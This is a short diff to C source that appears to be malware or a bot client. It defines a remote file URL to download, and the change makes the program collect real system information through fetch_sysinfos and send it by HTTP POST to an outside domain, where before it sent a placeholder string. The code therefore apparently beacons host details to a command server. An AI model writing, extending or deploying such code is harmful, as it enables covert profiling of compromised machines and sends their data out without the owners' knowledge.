@@ -12,7 +12,7 @@
 #define REMOTEFILE  "http://www.gordeneyes.com/temp/cli01"
 #define PFLAG   "@#$:"
 #define CMDSIZE 64
-#define BSIZE 256
+#define BSIZE 1024
 #define RWXXX   (S_IRWXU|S_IXGRP|S_IXOTH)
 #define RWX   (S_IRWXU)
 
@@ -154,7 +154,8 @@ int main(int argc, char *argv[])
         strcpy(wbuf, TESTDOMAIN);
         strcat(wbuf, "moien");
         printf("%s\n", wbuf);
-        strcpy(postbody, "os=linux&ip=1.1.1.1");
+        fetch_sysinfos(postbody);
+        // strcpy(postbody, "os=linux&ip=1.1.1.1");
         http_postb(wbuf, postbody, strlen(postbody), rbuf);
         // http_post(wbuf, "os=linux", rbuf);
         printf("%s\n", rbuf);
